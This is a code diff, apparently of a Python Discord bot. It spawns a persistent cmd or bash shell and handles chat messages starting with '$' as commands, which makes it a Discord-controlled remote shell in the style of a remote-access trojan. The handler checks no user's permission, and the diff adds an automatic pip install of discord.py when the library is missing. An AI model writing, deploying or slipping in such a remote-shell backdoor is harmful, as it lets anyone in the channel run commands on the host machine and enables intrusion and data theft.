@@ -1,10 +1,16 @@
-import discord
 import subprocess
 import threading
-import asyncio
-import importlib.util
-import sys
 import platform
+
+try:
+    import discord
+    import asyncio
+except ImportError:
+    import subprocess
+    subprocess.run(['pip', 'install', 'discord.py', 'asyncio'], check=True)
+    import discord
+    import asyncio
+
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -17,25 +23,27 @@ def read_output(pipe):
     for line in iter(pipe.readline, ""):
         output.append(line.strip())
 
-if platform.system() == "Windows":
-    shell = subprocess.Popen(
-        ["cmd"],
-        stdin=subprocess.PIPE,
-        stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE,
-        text=True,
-        universal_newlines=True,
-        bufsize=1,
-        creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
-    
-else:
-    shell = subprocess.Popen(
-        ["bash"],
-        stdin=subprocess.PIPE,
-        stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE,
-        text=True,
-        universal_newlines=True)
+def create_shell():
+    if platform.system() == "Windows":
+        return subprocess.Popen(
+            ["cmd"],
+            stdin=subprocess.PIPE,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+            universal_newlines=True,
+            bufsize=1,
+            creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
+    else:
+        return subprocess.Popen(
+            ["bash"],
+            stdin=subprocess.PIPE,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+            universal_newlines=True)
+
+shell = create_shell()
 
 stdout_thread = threading.Thread(target=read_output, args=(shell.stdout,))
 stderr_thread = threading.Thread(target=read_output, args=(shell.stderr,))
@@ -44,11 +52,11 @@ stderr_thread.start()
 
 @client.event
 async def on_message(message):
+    global shell, output
     if message.author == client.user:
         return
 
     if message.content.startswith('$'):
-        global output
         command = message.content[1:]
         if command == 'host':
             await message.channel.send(f"The bot is currently running on {platform.system()}.")
